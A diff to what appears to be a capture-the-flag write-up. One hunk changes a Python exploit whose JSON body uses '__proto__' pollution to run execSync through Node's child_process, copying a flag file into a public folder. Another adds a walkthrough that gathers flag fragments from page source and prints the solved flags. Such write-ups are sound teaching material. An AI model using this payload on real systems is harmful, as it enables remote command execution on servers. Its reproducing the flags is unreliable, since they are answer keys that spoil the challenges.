@@ -59,7 +59,7 @@ r = requests.post(TARGET_URL+'/api/submit', json = {
     "song.name":"The Goose went wild",
     "__proto__.block": {
         "type": "Text", 
-        "line": "process.mainModule.require('child_process')."
+        "line": "process.mainModule.require('child_process').execSync(`cat /app/flaghJZCt > /app/static/out`)"
     }
     })
 
@@ -77,6 +77,18 @@ CHTB{p0llute_with_styl3}
 ## Inspector Gadget
 
 Solved By: pwning
+
+Once the docker has spawn, visit the URL `http://138.68.182.108:30222`.
+You'll be greeted with a portion of the flag `CHTB{`
+
+All flags were found via viewing the source code if you press F12. The first flag was found in the HTML commented `1nsp3ction_`.
+After navigating around the page, we see another flag that is hidden in the main.js (`http://138.68.182.108:30222/static/js/main.js`)
+which looks like to be the end of the flag `us3full_1nf0rm4tion}`
+
+The last portion of the flag was found in the main.css (`http://138.68.182.108:30222/static/css/main.css`)
+c4n_r3ve4l_
+
+After collection all the portions of the flag, we get the flag: `CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}`
 
 ##
 
